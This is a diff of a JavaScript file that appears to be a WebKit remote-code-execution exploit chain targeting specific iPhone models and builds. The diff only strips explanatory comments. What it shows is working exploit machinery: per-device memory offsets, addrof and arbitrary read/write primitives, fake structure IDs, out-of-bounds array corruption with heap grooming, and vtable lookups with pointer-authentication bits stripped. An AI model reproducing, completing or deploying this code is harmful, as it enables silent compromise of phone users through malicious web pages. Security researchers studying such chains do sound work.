@@ -1,4 +1,4 @@
-/* HEADERS */
+
 const ab = new ArrayBuffer(8);
 const u64 = new BigUint64Array(ab);
 const u32 = new Uint32Array(ab);
@@ -25,7 +25,7 @@ BigInt.prototype.asInt32s = function() {
     return [lo, hi];
 };
 [].shift();
-/* HEADERS END */
+
 rce_offsets = {
    "iPhone11,2_4_6_22F76": {
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadec98n,
@@ -2781,7 +2781,7 @@ class check_attempt {
             let a = i == 0 ? change_scribble : junk0;
             results[i] = a[0];
         }
-        change_scribble_holder.p1 = results[0]; //now we have a valid structureID
+        change_scribble_holder.p1 = results[0]; 
 
         scribble_element.p3 = 1.1;
         scribble_element[0] = 1.1;
@@ -2841,7 +2841,7 @@ class check_attempt {
         this.read32 = read32;
         this.read64 = read64;
         this.write64 = write64;
-        // Disable Worklet GC
+        
         const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
 
         const heap = vm.add(0xc0n);
@@ -3264,7 +3264,7 @@ const device_chipset = {
                     continue;
 
                 const vtable = this.read64(scriptExecutionContext);
-                //print(`vtable: ${vtable.noPAC()}`);
+                
                 if (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                     continue;
 
@@ -3305,7 +3305,7 @@ const device_chipset = {
         const egg2 = 0x163967eb;
         const victim_list_size = 4*victim_array_allocations_in_page;
 
-        //FIXME change "victim" to "victim", they don't serve the same purpose here.
+        
         const victim_array_RO = () =>  {return [1.1,2.2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8];}
         var victim_list = new Array(victim_list_size).fill(1.1);
 
@@ -3315,10 +3315,10 @@ const device_chipset = {
             the_oob_object[i] = i;
         }
 
-        //var the_oob_object = the_oob_object_RO();
-        //the_oob_object[0] = 1.1; // we do this allocation now so thatonly on double->withStorage we will allocate.
-        //we count on COW to get us the rigth array sizes 
-        // we can probably use fill but whatever...
+        
+        
+        
+        
         for (let i = 0; i < victim_list_size; i++){
             victim_list[i] = victim_array_RO();
         }
@@ -3346,7 +3346,7 @@ const device_chipset = {
         delete the_oob_object[0];
         for(let i = 1; i < 31; i++){
             the_oob_object[i] = 1.1;
-        } //object should have 0x1e(30) items loaded, we want to overwrite +0x25(37)
+        } 
         const oob_object_target_length = 32;
         the_oob_object.length = oob_object_target_length;
         const holes_to_add = (oob_object_target_length - 30);
@@ -3436,7 +3436,7 @@ const device_chipset = {
 
             the_oob_object.splice(30,0,1,2,3,4,5,6,7);
 
-            //now we should have a victim with a nice length.
+            
 
             var oob_array_idx = undefined;
             var overlap_array_idx = undefined;
